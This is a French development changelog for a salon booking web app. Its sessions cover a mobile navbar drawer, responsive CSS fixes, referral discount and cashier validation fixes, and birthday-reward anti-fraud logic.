### Règles conservées dans BookingPage.jsx
Purement layout booking (sidebar, grid services, iframe, footer, étapes,
modals, tabs internes MyAppointments) : `bk-2c`, `bk-sb`, `bk-steps`,
`bk-slots`, `bk-emp-grid`, `bk-iframe`, `bk-footer-grid`, `bk-grid2`,
`bk-modal-inner`, `bk-touch`, `bk-ref-code`, `bk-share-btns`, `bk-side-logo`,
`bk-hours-row`, `bk-tabs`.

### Amélioration bonus — tabs MyAppointments scrollables
Les tabs `Mes RDV / Mon profil / Parrainage` peuvent déborder sur iPhone SE
(375px) quand Parrainage est actif. Ajout de `overflow-x:auto` sur le
container + `flex-shrink:0` sur les boutons → scroll horizontal fluide si
trop de tabs. Padding réduit à 12px 14px (mobile) et 10px 10px (< 480px).

### Build
- `npx vite build` : OK (13.30s, 87 modules).
- `page-booking` : 155.82 kB (+0.34 kB pour la `<style>` dupliquée dans
  NavBar, négligeable).

### Compatibilité préservée
- Desktop (> 767px) : comportement rigoureusement identique — les règles
  `@media(min-width:768px)` activent les mêmes `display:none`/flex qu'avant.
- La balise `<style>` dans NavBar est render à chaque montage ; comme la
  NavBar est montée 1 seule fois par vue, pas de duplication inutile dans
  le DOM.
- Les règles dans BookingPage.jsx restent actives sur la vue booking
  (sidebar, slots, grid employés, etc.).
- Aucune prop modifiée sur NavBar, MyAppointments ou ReferralPage.

---

## Session 2026-04-19 (suite 15) : Fix double navbar Mes RDV + URL + cleanup drawer

### Bug rapporté
Depuis le drawer mobile, click sur « Mes rendez-vous » :
- Page affichée en double (deux barres de navigation empilées).
- « Page de réservation » visible derrière au lieu de la vue Mes RDV.
- Le header doit rester fix (sticky) au scroll.

### Cause racine
1. **Double navbar** : `MyAppointments.jsx` rendait sa PROPRE `<nav>` avec
   `position:sticky; top:0; zIndex:50` (ligne 216). La vue 'myAppts' dans
   `BookingPage.jsx` rend déjà la NavBar principale avec logo + hamburger +
   drawer (depuis la session 14). Résultat : 2 navbars sticky empilées, d'où
   l'impression de page « en double » + la navbar du salon visible au-dessus
   de MyAppointments donnait l'illusion d'être resté sur la réservation.

2. **URL non synchronisée** : Sur la vue booking (ligne 825), le handler
   `onMyAppts={()=>setView('myAppts')}` ne faisait PAS de `navigate()`. L'URL
   restait `/book/:slug` alors que le state passait en 'myAppts'. Incohérent
   avec toutes les autres vues (myAppts / parrain / success) qui font bien
   `navigate('/client/rdv')`.

3. **Risque scroll bloqué** : `useEffect` du drawer restaurait
   `document.body.style.overflow = prevOverflow`. Si la NavBar était démontée
   pendant que `menuOpen=true` (ex : click sur un lien qui change de view
   avant la fin de la transition), le cleanup tournait mais restaurait
   éventuellement une valeur 'hidden' si `prevOverflow` avait été capturé
   avant l'ouverture.

### Fix — `booking/MyAppointments.jsx`
La `<nav sticky>` interne est remplacée par un **sub-header non-sticky**
(même contenu : bouton retour + avatar + nom/email client, même style visuel)
qui s'intègre au flux normal du document. La NavBar principale (du composant
`NavBar`) reste l'unique header sticky de la page.

### Fix — `BookingPage.jsx` vue booking
Le handler `onMyAppts` fait désormais :
```js
navigate(`/book/${slug}/client/rdv`, {replace:false});
setMyApptsInitTab('appts');
setView('myAppts');
```
Cohérent avec les handlers des autres vues (ligne 618, 644, 721, 1549).
Avantage : le bouton retour du navigateur fonctionne, l'URL reflète l'état.

### Fix — `booking/NavBar.jsx` cleanup useEffect
Le cleanup remet désormais `document.body.style.overflow = ''` (sans
capturer de valeur précédente). Garantit que le scroll body est toujours
libéré au démontage du composant, même si la NavBar est démontée pendant
que `menuOpen=true`.

### Header sticky préservé
La NavBar principale conserve `position:sticky; top:0; zIndex:50` dans
`booking/NavBar.jsx` (inchangé depuis la session 14). Le header reste donc
parfaitement fixe pendant le scroll sur toutes les vues (booking, myAppts,
parrain, success).

### Build
- `npx vite build` : OK (14.20s, 87 modules).
- `page-booking` stable (~155.48 kB, -0.04 kB grâce au retrait de la nav
  sticky dupliquée).

### Compatibilité préservée
- Sub-header MyAppointments : mêmes classes, mêmes icônes, mêmes props.
  Le bouton retour continue d'appeler `onBack` comme avant.
- Pas de changement d'API côté composant `NavBar`.
- Le lien `/book/:slug/client/rdv` est déjà géré par le useEffect d'URL
  (ligne 89 de BookingPage) → aucune route à ajouter dans `index.jsx`.
- Les vues 'parrain' et 'success' qui avaient déjà le bon navigate() restent
  inchangées.

---

## Session 2026-04-19 (suite 14) : NavBar mobile — menu hamburger drawer glissant

### Demande (onboarding.md)
La NavBar publique n'était pas responsive : l'utilisateur devait dézoomer pour
voir tous les boutons. Faire un menu latéral mobile qui glisse depuis la droite
(type application pro) avec les liens dedans, et garder les 3 boutons clés
visibles hors du menu : **Prestations, Équipe, Adresse**.

### Approche
Refonte complète de `booking/NavBar.jsx` avec **3 zones** adaptatives :
1. **Logo + nom business** (toujours visible, nom ellipsis/masqué sur très petit).
2. **Liens** :
   - Desktop (> 767px) : tous les liens horizontaux (comportement avant).
   - Tablette étroite (481-767px) : 3 liens rapides (Prestations / Équipe / Adresse).
   - Mobile (≤ 480px) : aucun lien visible, tout dans le drawer.
3. **Zone droite** :
   - Desktop : tel + thème + avatar/auth (comportement avant).
   - Mobile : uniquement bouton hamburger.

### Nouveau : Drawer mobile glissant
Panneau latéral droite animé via CSS transform + transition (cubic-bezier
iOS-like), overlay `rgba(0,0,0,0.5)` avec `backdrop-filter:blur(2px)`.

- Largeur : `min(86vw, 340px)`.
- Hauteur : `100dvh` (avec fallback `100vh`) pour éviter le bug de la barre
  d'URL mobile Safari qui mange la hauteur.
- `z-index:200` (au-dessus des modals 100, sous les toasts).
- Transform `translateX(100%)` → `translateX(0)` sur `.open`, transition 280ms
  cubic-bezier(0.16, 1, 0.3, 1) (ease-out iOS natif).
- Fermeture : backdrop click, bouton ✕, touche Escape, click sur un lien.
- Scroll body bloqué (`document.body.style.overflow='hidden'`) pendant ouverture,
  restauré au démontage.

### Contenu du drawer
1. **Header** : logo + nom business + bouton ✕ (fermer).
2. **Bloc auth** :
   - Si connecté : avatar + prénom → Mes RDV (avec chevron) + bouton
     "Se déconnecter" rouge.
   - Sinon : gros bouton "Connexion / Créer un compte".
3. **Liens de navigation** : tous les liens disponibles (Prestations, Équipe,
   Commentaires, Parrainage, Photos, Adresse) avec chevron ›.
4. **Footer** : tel clickable + toggle thème avec label "Mode clair/sombre".

### Règles CSS ajoutées (feuille globale BookingPage.jsx)
```css
.bk-do-right{ display:flex }       /* zone droite desktop */
.bk-mo-quick{ display:none }       /* liens rapides tablet */
.bk-mo-hamb{ display:none }        /* bouton hamburger mobile */

@media(max-width:767px){
  .bk-do, .bk-do-right{ display:none!important }
  .bk-mo-quick, .bk-mo-hamb{ display:flex!important }
}
@media(max-width:480px){
  .bk-mo-quick{ display:none!important }
  .bk-nav-title{ max-width:110px }
}
@media(max-width:360px){
  .bk-nav-title{ display:none }   /* plus que logo + hamburger */
}

.bk-drawer{ position:fixed; inset:0; z-index:200; pointer-events:none }
.bk-drawer.open{ pointer-events:auto }
.bk-drawer-backdrop{ /* overlay flouté avec fade */ }
.bk-drawer-panel{ /* panneau droite, transform translateX(100%) initial */ }
.bk-drawer.open .bk-drawer-panel{ transform:translateX(0) }
@media(min-width:768px){ .bk-drawer{ display:none } }
```

### NavBar.jsx — logique ajoutée
- Hook `useState(menuOpen)`.
- Hook `useEffect` : écoute Escape + lock scroll body pendant ouverture.
- Fonction `scrollTo(id)` mise à jour : ferme le drawer avant de scroller.
- Liste `allLinks` factorisée : utilisée **desktop** ET **drawer mobile**
  (pas de duplication des conditions Commentaires/Parrainage/Photos).

### Accessibilité
- `aria-label="Ouvrir le menu"` / `"Fermer"` sur les boutons hamburger/close.
- `aria-hidden={!menuOpen}` sur le drawer.
- Fermeture via Escape (keyboard navigation).
- Zone tactile des boutons ≥ 40px (hamburger + close à 40×40).
- Focus visible préservé (aucun outline retiré).

### Build
- `npx vite build` : OK (23.01s, 87 modules).
- `page-booking` : +8.79 kB (146.73 → 155.52) pour NavBar refactorée + drawer.

### Compatibilité préservée
- **Desktop (> 767px)** : comportement **rigoureusement identique** avant refonte.
  Les liens horizontaux, tel, thème, avatar/auth sont exactement aux mêmes
  positions avec les mêmes styles.
- **Les 3 breakpoints progressifs** (767 / 480 / 360) évitent les sauts.
- `bk-do` classe existante respectée : en desktop elle reste visible, en mobile
  elle disparaît. Les nouveaux `bk-do-right`, `bk-mo-quick`, `bk-mo-hamb`
  complètent le système sans modifier les règles existantes.
- Aucun prop ajouté/retiré au composant `NavBar` (rétrocompatible avec
  `BookingPage.jsx` et toutes les vues qui l'utilisent).
- Le drawer est rendu dans le DOM même fermé (avec `pointer-events:none`) pour
  permettre les transitions ; sur desktop il est `display:none` via media query.

### Test visuel recommandé
- Desktop 1440px, 1280px, 1024px → liens horizontaux visibles, zéro dézoom.
- Tablette 768px (portrait iPad) : liens classiques (dernier breakpoint desktop).
- Mobile landscape 820px : liens classiques.
- Mobile 667px, 568px (iPhone SE landscape) : 3 liens rapides + hamburger.
- Mobile 414px, 390px, 375px (iPhone SE, 13, 14) : logo + hamburger seul,
  drawer fonctionnel.
- Mobile 320px (très petit) : nom business masqué, logo + hamburger uniquement.
- Drawer : click backdrop, click ✕, Escape → ferme. Click sur lien → scroll + ferme.

---

## Session 2026-04-19 (suite 13) : Réservation publique — responsivité mobile complète

### Demande (onboarding.md)
Rendre le site de réservation **parfaitement responsive** sur tous types d'écrans
sans casser aucune fonctionnalité.

### Approche
Plutôt que d'injecter des inline styles avec des `isMobile` partout (risque de
régression desktop, diffs lourds), extension **chirurgicale** de la feuille
`<style>` globale déjà présente dans `BookingPage.jsx` (ligne 748) avec des
règles `@media` ciblées + ajout de `className` aux éléments problématiques.

Breakpoints utilisés : `767px` (mobile+tablet portrait), `480px` (smartphones),
`360px` (très petits écrans type iPhone SE).

### BookingPage.jsx — Feuille styles étendue
Nouvelles règles ajoutées :
- `@media(max-width:767px)` :
  - `.bk-sb` passe en `width:100%`, `position:static`, `padding-top:12px`
    (sidebar full-width au lieu d'être sticky 290px).
  - `.bk-nav-title` ellipsis 160px max (business name long ne déborde plus).
  - `.bk-footer-grid` → 1 colonne + gap réduit 16px.
  - `.bk-iframe` height 180px (au lieu de 240px).
  - `.bk-slots` 2 colonnes (au lieu de 3) pour créneaux.
  - `.bk-grid2` → 1 colonne pour prénom/nom et mois/année.
  - `.bk-share-btns` row-gap 8px (boutons partage parrainage).
  - `.bk-ref-code` font-size 16px + letter-spacing 1px.
  - `.bk-side-logo` 64×64 (au lieu de 80×80).
  - `.bk-emp-grid` 1 colonne (au lieu de auto-fill 200px).
  - `.bk-tabs button` padding + font réduits.
- `@media(max-width:480px)` :
  - `.bk-steps` padding 0 4px (existait déjà).
  - `.bk-slots` gap 8px.
  - `.bk-hours-row` padding 7px 12px (horaires plus compacts).
  - `.bk-nav-pad` padding 0 12px (navbar plus étroite).
- `@media(max-width:360px)` :
  - `.bk-slots` 1 colonne (créneaux pleine largeur).
  - `.bk-share-btns button` flex 1 1 100% (partage full-width).
- `.bk-modal-inner` → `max-height:90vh; overflow-y:auto` (tous les modals).
- `.bk-touch` → `min-height:44px` (utilitaire cible tactile).

### Classes appliquées

#### BookingPage.jsx
- Step 2 grid employés : ajout `bk-emp-grid`.
- Step 4 grid créneaux : ajout `bk-slots` + `minHeight:48` sur les boutons.
- Section adresse iframe : ajout `bk-iframe`.
- Footer "Nous contacter / Bon à savoir" : ajout `bk-footer-grid`.

#### booking/NavBar.jsx
- Container NavBar : `bk-nav-pad` (padding réduit mobile).
- Span business name : `bk-nav-title` (ellipsis mobile).

#### booking/SideCard.jsx
- Logo avatar rond : `bk-side-logo` (64×64 mobile).
- Lignes horaires : `bk-hours-row` (padding réduit).

#### booking/Account.jsx
- Grid prénom/nom (x2) + grid mois/année + grid profil : tous `bk-grid2`.

#### booking/MyAppointments.jsx
- 2 modals (annulation + info commerçant) : ajout `bk-modal-inner` + `maxHeight:90vh; overflowY:auto`.
- Tabs RDV/Fidélité/Profil : `bk-tabs bk-nav-pad`.

#### booking/ReferralPage.jsx
- Code parrainage monospace : `bk-ref-code`.
- Boutons partage SMS/WhatsApp/lien : `bk-share-btns`.

### Build
- `npx vite build` : OK (11.78s, 87 modules). `page-booking` +1.77 kB pour
  la feuille de styles étendue et les classNames.

### Compatibilité préservée
- Zéro modification de logique métier ou de handlers.
- Aucune prop supplémentaire, aucun import `useMediaQuery`/`useWindowSize`.
- Les styles desktop existants sont conservés (les `@media` ne s'activent que
  sous le breakpoint).
- Les classes existantes (`bk-do`, `bk-mo`, `bk-steps`, `bk-2c`, `bk-sb`,
  `rp-grid3`, `rp-code-row`) continuent de fonctionner normalement.
- Les modals restent visibles et fonctionnels desktop ; seul ajout mobile =
  scroll interne si le contenu dépasse 90vh.
- Les breakpoints progressifs (767 → 480 → 360) évitent les sauts brusques.

### Test visuel recommandé
- iPhone SE (375×667), iPhone 14 (390×844), Galaxy S21 (360×800).
- Pixel 4 (411×869), iPad Mini portrait (768×1024, reste desktop).
- Rotation portrait/paysage : sidebar passe order:-1 en portrait, flex desktop
  en paysage large (>767px).

---

## Session 2026-04-19 (suite 12) : Parrainage — fix réduction filleul + traçabilité agenda + refus caisse

### Demande (onboarding.md)
Programme parrainage cassé. Fix complet à faire :
1. Parcours utilisateur + validation parrainages + suivi côté client
2. Réduction prix sur site de réservation ET en caisse
3. Traçabilité agenda : « ce client est parrainé par … · réduction parrainage -…€ »
4. Possibilité pour l'employé d'annuler un parrainage à la caisse
5. Accréditer le parrain et voir cela sur sa page parrainage
6. Tous côtés : commerçant, site de réservation, client

### Bugs identifiés avant correction
- **BUG 1 (CRITIQUE)** : La réduction filleul n'était **jamais appliquée** au RDV.
  Le code acceptait `referral_code` mais créait seulement `referral_uses` status=pending,
  sans jamais modifier `discount_amount`/`total_amount`. Le filleul pensait bénéficier
  d'une réduction mais payait plein prix.
- **BUG 2** : Aucun affichage « Parrainé par X » sur l'agenda commerçant/employé.
  Impossible de savoir en un coup d'œil qu'un RDV est issu d'un parrainage.
- **BUG 4** : Aucun bouton « Refuser » en caisse. L'employé pouvait seulement valider.
  Si parrainage suspect (ex : filleul déjà connu), seule option = ignorer → reste « pending ».

### Backend — `routes/public-booking.js` (POST /:slug/book)
- **Bloc parrainage déplacé AVANT l'INSERT appointment** (nouveau bloc lignes ~711-781).
  Le bloc ancien (après INSERT, lignes ~846-922) est remplacé par un simple INSERT
  `referral_uses` qui utilise le contexte `referralCtx` calculé en amont.
- Ajout var `let referralCtx = null` à côté de `discountAmt`/`finalPrice` pour
  remonter le contexte sans dupliquer la requête code parrainage.
- Nouveau bloc : vérifie `!promoCodeId && incomingRef && client_email` (priorité au
  code promo classique si les deux sont fournis).
- Vérifie programme actif + code valide + parrain ≠ filleul + filleul nouveau
  (pas de RDV antérieur) + pas de parrainage pending/validated existant + quota
  parrain OK (réutilise la logique `limit_period`/`limit_count`).
- Si tout OK : calcule la réduction filleul (`percent` ou `fixed` depuis
  `referral_programs.filleul_type`/`filleul_value`) et l'applique à `discountAmt`
  + `finalPrice` avant l'INSERT. Le RDV est créé avec les bonnes valeurs
  `original_amount`/`discount_amount`/`total_amount`.
- Après INSERT : `INSERT INTO referral_uses` avec appt.id, status='pending'.
  La validation en caisse reste nécessaire pour émettre la récompense parrain.

### Backend — `routes/referrals.js`
- Nouveau endpoint **POST /api/referrals/uses/:id/cancel** (commerçant) :
  - UPDATE status='pending' → 'cancelled'
  - Aucune récompense émise
  - La réduction filleul déjà appliquée au RDV n'est PAS restituée (le filleul
    garde son prix réduit, le parrain ne reçoit rien). Cohérent avec le fait que
    le filleul est venu.
  - 404 si parrainage introuvable ou déjà traité (validated/cancelled).

### Backend — `routes/booking.js` (listing agenda commerçant + agenda employé)
- GET `/api/booking/appointments` : LEFT JOIN `referral_uses` + `referral_codes`
  + `client_accounts` (parrain). Colonnes exposées :
  `referral_use_id`, `referral_status`, `referral_code`, `referral_parrain_email`,
  `referral_parrain_first_name`, `referral_parrain_last_name`.
- GET `/api/booking/employee-agenda` : mêmes jointures, mêmes colonnes exposées.
- LEFT JOIN → zéro impact sur les RDV sans parrainage (colonnes NULL).

### Frontend — `utils/api.js`
- `referralsApi.cancelUse(id)` : POST `/referrals/uses/:id/cancel`.

### Frontend — `App.jsx` (caisse commerçant)
- Nouvelle fonction `cancelReferral(useId)` : confirme via `window.confirm`,
  appelle `referralsApi.cancelUse`, rafraîchit le contexte.
- Bloc `pendingRefs.map` : ajout d'un **bouton « Refuser »** (rouge, outlined)
  à côté de « Valider ». Même état `refValidating` pour désactiver les deux
  pendant l'appel.

### Frontend — `pages/Agenda.jsx` (modal détail RDV)
- Nouveau bloc **« Parrainage »** rendu conditionnellement si `appt.referral_use_id`
  existe. Affiche :
  - Badge statut coloré (Validé=vert / Refusé=rouge / À valider en caisse=orange).
  - « Parrainé par {prénom nom|email} » en titre.
  - Code parrainage + montant de la réduction si > 0.
- Label du total dynamique : `Total après parrainage` si `referral_use_id` présent,
  sinon `Total après remise` pour les promos classiques (fallback `Total`).

### Frontend — `pages/EmployeeAgenda.jsx` (modal détail côté employé)
- Section « Code promo » devient dynamique : si `referral_use_id`, affiche
  « 🤝 Réduction parrainage » avec le code parrainage au lieu de « 🎉 Code promo ».
- Nouveau bloc « Parrainage » identique à Agenda.jsx (badge statut + parrain + code).

### Parcours utilisateur corrigé (scénarios validés)

**Scénario A — Filleul réserve avec code parrainage valide :**
1. Site réservation : client saisit code `REF-XXXXXX` à l'étape 5.
2. POST `/book` valide le code, applique la réduction filleul au RDV.
3. RDV créé avec `discount_amount` > 0, `total_amount` = prix réduit, + ligne
   `referral_uses` status='pending' liée à appt.id.
4. Email de confirmation envoie déjà `finalPrice`/`discountAmount` (code promo
   existant → non modifié, mais la réduction parrainage n'apparaît pas encore
   dans l'email. Acceptable à la v1, à suivre).

**Scénario B — Commerçant consulte l'agenda :**
- Modal RDV affiche « 🤝 Parrainage · À valider en caisse · Parrainé par X · Code REF-… · Réduction -Y€ ».
- Total affiche prix barré + prix réduit, label « Total après parrainage ».

**Scénario C — Employé encaisse le filleul en caisse :**
- Bloc « Filleul de X — Valider · Refuser » s'affiche dès que l'email client est renseigné.
- Clic « Valider » → code promo parrain généré (PARRAIN-XXXXXX) + client_rewards
  créé pour le parrain + email envoyé au parrain. Le parrainage passe en 'validated'.
- Clic « Refuser » → status='cancelled', aucun code parrain émis. La réduction
  filleul reste acquise (déjà appliquée au RDV).

**Scénario D — Parrain consulte sa page /parrain :**
- Historique filleuls : affiche 4 états (En attente / Validé / Utilisée / Refusé).
  Déjà fonctionnel depuis suite 9 (référence `reward_status`).
- Récompenses disponibles : codes PARRAIN-XXXXXX apparaissent dès validation en caisse.

### Build
- `node --check` × 3 backend : OK
- `npx vite build` : OK (14.82s, 87 modules)

### Compatibilité préservée
- Priorité au `promo_code_id` si présent → les clients qui utilisent un code promo
  classique voient ce code appliqué, pas la réduction parrainage (comportement
  attendu, on ne cumule pas).
- RDV existants sans parrainage : LEFT JOIN renvoie NULL partout → aucun changement
  d'affichage.
- Parrainages déjà `pending` avant cette session : la réduction filleul n'est
  pas rétroactive (RDV existant garde son prix d'origine). Seuls les nouveaux
  RDV bénéficient de la réduction automatique.
- Endpoint `/cancel` rejette les parrainages non-pending → aucun risque de
  casser un parrainage déjà validé.

---

## Session 2026-04-19 (suite 11) : Programme anniversaire — anti-fraude + birth_date optionnelle + popup

### Demande (onboarding.md)
1. Birth_date obligatoire pour bénéficier du programme anniversaire (sinon
   client exclu).
2. Inscription : **phone + mois/année de naissance optionnels**. Popup
   post-1re-inscription pour demander ces champs.
3. Programme anniversaire : **1 seule fois par an** par client.
4. Anti-fraude : si le client a déjà bénéficié puis change sa birth_date,
   il ne doit pas pouvoir recevoir un second cadeau avant son prochain
   anniversaire (année suivante).

### Backend — `db/index.js`
- 2 nouvelles colonnes idempotentes (ADD COLUMN IF NOT EXISTS) :
  - `global_clients.last_birthday_reward_at  TIMESTAMPTZ`
  - `client_accounts.last_birthday_reward_at TIMESTAMPTZ`
- Sert à bloquer un second reward dans les 330 jours même si birth_date change.

### Backend — `index.js` (cron `runBirthdayPromos`)
- Requête des candidats étendue : rejette les clients dont
  `last_birthday_reward_at IS NULL OR last_birthday_reward_at < NOW() -
  INTERVAL '330 days'` (jointure `global_clients` ajoutée pour vérifier
  les deux tables en parallèle).
- Après création du reward : UPDATE `last_birthday_reward_at = NOW()` sur
  `client_accounts` (user_id+email) ET `global_clients` (email).
- Le garde-fou existant `EXTRACT(YEAR FROM created_at) = currentYear` sur
  `client_rewards` reste en place (double protection année calendaire).

### Backend — `routes/public-booking.js`
- POST `/:slug/client/register` : accepte `birth_date` optionnel au format
  `YYYY-MM-DD` ou `YYYY-MM` (→ `YYYY-MM-01`). Saved sur `global_clients` +
  `client_accounts` (INSERT ou ON CONFLICT update via COALESCE).
- PUT `/:slug/client/profile` : accepte `birth_date` optionnel (même format).
  SET dynamique : si le champ n'est pas présent dans le body, pas de modif.
  Si `birth_date === ''` ou `null`, reset à NULL. Sync global_clients.

### Frontend — `pages/booking/Account.jsx`
- `AuthPanel.submit()` : après register/login réussi, appelle
  `onAuth(client, { justRegistered: mode === 'register' })` pour que le
  parent sache si c'est la 1re inscription.
- Nouveau composant `PostRegisterPopup` (overlay modal 3000 z-index) :
  - Champs **Mois** (select 1→12) + **Année** (input 4 chiffres).
  - Champ **Téléphone** optionnel si manquant.
  - Boutons **Plus tard** (skip) / **Enregistrer** (appel updateClientProfile
    avec body `{ birth_date: 'YYYY-MM' }` → backend convertit en YYYY-MM-01).
  - Mention "Sans date de naissance, vous ne participerez pas au programme
    anniversaire." pour informer du trade-off.
  - Validation : si l'un des 2 champs (mois/année) est rempli, l'autre est
    requis ; année entre 1900 et année courante.

### Frontend — `pages/BookingPage.jsx`
- Import `PostRegisterPopup`.
- Nouveau state `showPostRegister`.
- `handleAuth(client, meta)` :
  - Ouvre le popup uniquement si `meta.justRegistered` ET `client.birth_date`
    vide ET aucun flag `ff_post_register_shown_<email>` en localStorage.
  - Flag persistant par email (écrit au premier affichage, même si skip)
    pour ne jamais ré-afficher le popup à ce même client.
- `onAuth={(u, meta) => handleAuth(u, meta)}` propagé dans AuthPanel wrapper +
  `onAuthSuccess` (ReferralPage).
- Overlay rendu via variable locale `postRegOverlay` inclus en Fragment à
  la fin de chaque branche de retour (myAppts / parrain / success / default).

### Anti-fraude — démonstration
Scenario : Marie reçoit un reward le 15/03/2026 (DOB = 15/03).
- Elle change sa DOB en 10/06 le 20/03/2026.
- 10/06/2026 : cron check → `last_birthday_reward_at = 15/03/2026`, NOW() -
  last = 87 jours < 330 → **skip**. Pas de reward.
- 05/03/2027 (prochain vrai anniversaire) : cron → last = 15/03/2026,
  NOW() - last = 355 jours > 330 → reward autorisé.
- Résultat : 1 reward/an garanti, même si le client manipule birth_date.

### Build
- `node --check` × 4 backend : OK
- `npx vite build` : OK (14.22s, 87 modules, page-booking +4.7 kB pour le
  popup + wrapping fragments).

### Compatibilité préservée
- Colonnes ajoutées avec `IF NOT EXISTS` → idempotent.
- `last_birthday_reward_at` NULL pour les clients existants → aucun blocage
  rétroactif (ils bénéficient du prochain anniversaire normalement).
- Route register : `birth_date` ignoré si absent/invalide (pas d'erreur 400).
- Route PUT profile : `birth_date === undefined` = pas de modification (les
  anciens clients qui update sans envoyer ce champ ne perdent pas leur DOB).
- Popup : localStorage flag évite l'affichage répété ; bouton "Plus tard"
  ferme sans sauver (le flag reste écrit, car la 1re occasion de proposer
  la saisie a eu lieu).

---

## Session 2026-04-19 (suite 10) : Fix parrainage — détection client connecté + bloc auth unifié

### Bug rapporté (onboarding.md)
1. Client **authentifié** sur le site du commerçant → la page `/parrain`
   affichait quand même la vue "Non connecté" (Les conditions chez … + Se
   connecter / Créer un compte).
2. Le bloc d'auth non connecté (simple bannière bleue avec 2 boutons) n'était
   pas cohérent avec celui de l'étape 5 `/info` (Déjà un compte ? + 3 boutons
   + Continuer avec Google).

### Cause racine
- `gcConnected={!!localStorage.getItem('ff_gc_token')}` dans `BookingPage.jsx`
  référençait une clé (`ff_gc_token`) qui n'est **jamais écrite** côté front
  (grep confirme : seulement lue, jamais `setItem`).
- Le vrai jeton après login commerçant est `ff_client_token` (scope='client'
  avec `globalClientId`). Résultat : `gcConnected` toujours `false`, vue
  "Non connecté" affichée même pour un client authentifié.
- Les endpoints `/me/referral-code/:slug` et `/me/referral-history/:slug`
  exigeaient `scope='global_client'` → impossible d'y accéder avec le jeton
  commerçant.

### Backend — `routes/global-clients.js`
- Nouveau middleware `clientOrGlobalClientAuth` qui accepte les deux scopes :
  - `scope='global_client'` avec `globalClientId` → `req.globalClient = dec`
  - `scope='client'` avec `globalClientId`        → `req.globalClient = { globalClientId, email }`
- Appliqué à `/me/referral-code/:slug` et `/me/referral-history/:slug`
  (remplace `globalClientAuth`). `globalClientAuth` reste intact pour les
  routes compte plateforme (`/me`, `/appointments`, `/loyalty`, etc.).

### Frontend — `utils/api.js`
- `gcRequest` fait désormais un fallback automatique :
  `token` paramétré → `ff_gc_token` → `ff_client_token`. Permet aux méthodes
  `myReferralCode` / `myReferralHistory` (sans token explicite) de fonctionner
  avec le jeton commerçant.

### Frontend — `BookingPage.jsx`
- `gcConnected={!!clientUser}` (état React réactif, mis à jour par handleAuth
  après login/register/Google OAuth).
- Le useEffect de chargement parrainage accepte `ff_client_token` OU
  `ff_gc_token` comme déclencheur.
- Nouveau prop `onAuthSuccess={handleAuth}` passé à `ReferralPage` → le
  client reste sur /parrain après Google OAuth, le useEffect recharge
  automatiquement code + historique.

### Frontend — `pages/booking/ReferralPage.jsx`
- Import `pubApi` pour le Google OAuth inline.
- Nouveau prop `onAuthSuccess(client)`.
- Bloc "CTA connexion" (bannière bleue) remplacé par un bloc cohérent avec
  `/info` :
  - Titre **"Déjà un compte ? Connectez-vous"** + sous-titre explicatif
  - Grille 2 colonnes : **Se connecter** (accent) / **Créer un compte**
  - Bouton **Continuer avec Google** pleine largeur (popup OAuth → handler
    postMessage → écrit `ff_client_token` + `ff_client_info` → appelle
    `onAuthSuccess(client)` → retour direct sur la vue connectée du parrain).

### Build
- `node --check` backend global-clients.js : OK
- `npx vite build` : OK (12.67s, 87 modules, page-booking stable)

### Compatibilité préservée
- Les clients avec un `ff_gc_token` existant (ancien flow) continuent de
  fonctionner via le fallback dans `gcRequest`.
- Les routes compte plateforme (`/me`, `/appointments`, `/loyalty`)
  continuent à exiger strictement `scope='global_client'`.
- Aucune migration DB nécessaire (pure logique auth/frontend).

---

## Session 2026-04-19 (suite 9) : Page parrainage connectée — statut "Utilisée" + maquette stricte

### Demande (onboarding.md)
Reproduire **exactement** la maquette client connecté de `/parrainage` avec
les **4 statuts filleul** : Validé / Utilisée / En attente / Refusé.

### Backend
- `db/index.js` : nouvelle colonne `client_rewards.referral_use_id UUID` avec
  FK douce vers `referral_uses(id) ON DELETE SET NULL` + index partiel
  `idx_client_rewards_ref_use WHERE referral_use_id IS NOT NULL`. Migration
  idempotente.
- `routes/referrals.js validate` : INSERT client_rewards passe maintenant
  `use.id` dans `referral_use_id` → lien direct entre le filleul validé
  et la récompense parrain émise.
- `routes/global-clients.js` GET `/me/referral-history/:slug` : LEFT JOIN
  sur `client_rewards` via `referral_use_id`. Chaque ligne `history`
  expose désormais `reward_status` ('available'|'used'|null) et
  `reward_used_at`.

### Frontend — `pages/booking/ReferralPage.jsx`
- **Helper `filleulVisualState(h)`** : retourne `validated|used|pending|cancelled`.
  - `validated + reward_status='used'`  → "used"      → badge gris + montant barré
  - `validated + reward_status='available'` → "validated" → badge vert + +montant
  - `pending`   → "pending"  → badge orange + tiret
  - `cancelled` → "cancelled" → badge rouge anonymisé
- `renderFilleulStatus()` retravaillé : 4 branches, surface neutre `neutralBg`
  pour le badge "Utilisée".
- `filleulAvatarColor()` : la pastille reste verte pour "used" (contexte
  positif : parrainage validé qui a porté ses fruits).
- `filleulSubtitle()` : pending affiche "RDV prévu le …" (cohérent maquette).
- Filtre rewards harmonisé : `reward_type IN ('referral', 'referral_parrain')`
  pour compat legacy (la route validate insère 'referral_parrain').

### Build
- `node --check` × 3 backend : OK
- `npx vite build` : OK (14.84s, 87 modules, page-booking +0.5 kB)

### Préservation
- Anciennes lignes `client_rewards` sans `referral_use_id` restent affichées
  comme "Validé" (LEFT JOIN renvoie NULL → tombe dans le cas par défaut).
- Aucune migration de données nécessaire ; les futures validations utilisent
  la nouvelle colonne automatiquement.

---

## 🆕 Session 2026-04-19 (suite 8) : Page Fidélité unifiée + limite anti-abus parrainage

### Demande (onboarding.md)
1. Fusionner `/settings/marketing/parrainage` et `/anniversaire` dans une
   seule page `/fidelite` avec des **accordéons fermés par défaut**.
2. Ajouter une limite de parrainages par client : 1 fois à vie, X fois par
   mois, X fois sur 3 mois, X fois par an, illimité.
3. Bien distinguer **montant fixe** vs **pourcentage** indépendamment pour
   parrain et filleul (déjà géré, validé).
4. Ne rien casser, éviter la duplication, logique claire parrain/filleul.

### Backend
- `db/index.js` : 2 nouvelles colonnes sur `referral_programs` :
  - `limit_count` INT (NULL = illimité ; 1 forcé pour 'lifetime')
  - `limit_period` VARCHAR(16) DEFAULT 'unlimited'
    (valeurs : `unlimited` | `lifetime` | `month` | `3months` | `year`)
  - Migration idempotente via `ALTER TABLE ... ADD COLUMN IF NOT EXISTS`
- `routes/referrals.js` GET+PUT `/program` : expose et persiste les 2 nouveaux
  champs. Validation : `limit_period` whitelisté, `limit_count` ≥ 1, et
  forcé à 1 si période = 'lifetime'.
- `routes/global-clients.js` GET `/pub/:slug/referral-program` : ajoute
  `limit_count` + `limit_period` dans la réponse publique.
- `routes/public-booking.js` POST `/:slug/book` : **garde anti-abus**.
